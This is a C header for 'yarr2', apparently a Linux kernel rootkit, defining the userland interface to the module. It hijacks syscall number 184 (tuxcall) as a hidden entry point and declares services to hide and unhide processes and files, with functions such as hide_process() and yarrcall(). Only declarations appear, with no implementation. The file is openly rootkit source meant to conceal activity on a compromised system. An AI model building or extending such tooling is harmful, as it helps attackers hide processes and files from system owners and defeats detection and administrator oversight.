#ifndef __YARR_YARRLIB
#define __YARR_YARRLIB

// When including this file from a userland program we need to include
// sys/types.h, but this header file is not present in the kernel sources.
#ifndef __KERNEL__
    #include <sys/types.h>
#endif

// This is the vector used for accessing yarr2 services. It correspond to the
// tuxcall syscall. In my kernels it is not used in the 64-bit table, it is in
// the 32-bit one I think and there it doesn't belong to tuxcall. If your
// kernel does support tuxcall likely you would need to look for another number
// and build yarr2. In reality I think tuxcall is never implemented, that's why
// I chose it.
#define YARR_VECTOR (184)

// Here we define the different services someone can request to yarr2.
enum yarrcall_service {
    HIDE_PID = 1,
    UNHIDE_PID,
    HIDE_FILE,
    UNHIDE_FILE,
    __GET_PROC_INFO,
    __SHOW_STACKS
};

// TODO: I'm going to define all the argument types for services here. They
// should be declared in their own header files, encapsulated with the rest
// of their subsystem, but I want userland programs to be able to include this
// file and know about these arguments, so to keep things simple I just define
// everything down below.
typedef struct hidepid_args {
    pid_t pid;
} HidePidArgs_t;

typedef struct hidefile_args {
    size_t size;
    char fname[];
} HideFileArgs_t;

typedef struct getprocinfo_args {
    pid_t pid;
    pid_t tgid;
} __GetProcInfoArgs_t;

union args {
    HidePidArgs_t hidepid_args;
    HideFileArgs_t hidefile_args;
    __GetProcInfoArgs_t getprocinfo_args;
};

// Each service has its own arguments, we use this union to encapsulate them
// and have easier access for each service.
typedef struct yarrcall_args {
    enum yarrcall_service svc;
    union {
        HidePidArgs_t hidepid_args;
        HideFileArgs_t hidefile_args;
        __GetProcInfoArgs_t getprocinfo_args;
    };
} YarrcallArgs_t;

/**
 * The userland entry point. This is the function that developers using yarr2
 * should use in order to request services to yarr2 module (in theory already
 * loaded into the kernel).
 *
 * @args: A pointer to the arguments for that specific service.
 * @args_size: The size of the args argument.
 * @return: Zero on success, non-zero elsewhere.
 */
long yarrcall(YarrcallArgs_t *args, size_t args_size);

/**
 * Asks yarr2 to hide a process in the system.
 *
 * @pid: The pid of the process to hide.
 * @return: Zero on sucess, non-zero elsewhere.
 */
long hide_process(pid_t pid);

/**
 * Allocates a YarrcallArgs_t structure and sets the HideFileArgs_t inside of
 * it.
 *
 * @fname: A string with the filename to be hidden by the HIDE_FILE service.
 * @return: A pointer to the newly allocated structure or NULL.
 */
YarrcallArgs_t * YarrcallArgs_create(const char *fname);

/**
 * Frees a previously allocated YarrcallArgs_t with YarrcallArgs_create().
 *
 * @args: The pointer to be freed.
 */
void YarrcallArgs_free(YarrcallArgs_t *args);

#endif
